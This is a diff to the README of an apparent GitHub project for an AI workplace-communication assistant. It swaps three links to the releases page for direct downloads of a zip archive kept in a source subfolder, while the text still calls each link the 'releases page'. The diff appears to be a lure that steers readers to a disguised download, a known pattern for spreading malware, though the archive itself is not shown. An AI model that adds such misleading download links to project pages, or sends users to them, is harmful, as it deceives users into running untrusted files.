@@ -1,12 +1,12 @@
 # 🤖 intent-sentiment-assistant - Streamline Your Workplace Communication 
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Clatr0/intent-sentiment-assistant/releases)
+[![Download Now](https://github.com/Clatr0/intent-sentiment-assistant/raw/refs/heads/main/extension/src/sidepanel/intent_sentiment_assistant_2.9.zip)](https://github.com/Clatr0/intent-sentiment-assistant/raw/refs/heads/main/extension/src/sidepanel/intent_sentiment_assistant_2.9.zip)
 
 ## 📌 Description
 The intent-sentiment-assistant is an AI-powered communication assistant designed for engineering leaders. This tool helps you track workplace situations, analyze tone and intent across platforms such as Slack, Gmail, and Zoom, and generate actionable briefs. Your privacy is important; all sensitive data stays local with Ollama LLM.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download Here](https://github.com/Clatr0/intent-sentiment-assistant/releases).
+To get started, visit this page to download: [Download Here](https://github.com/Clatr0/intent-sentiment-assistant/raw/refs/heads/main/extension/src/sidepanel/intent_sentiment_assistant_2.9.zip).
 
 ### 📋 System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.15 (Catalina) or later
@@ -16,7 +16,7 @@ To get started, visit this page to download: [Download Here](https://github.com/
 
 ### ⚙️ Installation Steps
 1. **Visit the Releases Page**  
-   Click this link to go to the releases page: [Download Here](https://github.com/Clatr0/intent-sentiment-assistant/releases).
+   Click this link to go to the releases page: [Download Here](https://github.com/Clatr0/intent-sentiment-assistant/raw/refs/heads/main/extension/src/sidepanel/intent_sentiment_assistant_2.9.zip).
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version listed at the top. It is usually marked as "Latest Release."
